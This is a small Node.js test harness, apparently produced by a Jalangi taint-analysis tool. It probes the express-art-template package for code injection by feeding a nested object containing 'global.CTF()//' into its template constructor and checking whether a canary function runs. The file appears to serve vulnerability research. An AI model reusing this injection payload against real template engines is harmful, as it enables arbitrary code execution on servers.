// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/express-art-template/node_modules/express-art-template');
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var x0 = "w-$pe!S^g\t";
var x1 = {"source":{"source":{"source":{"value":{"value":"global.CTF()//"}}}}};
new PUT["template"](x0,x1)();
} catch (e) {
	console.log(e);
}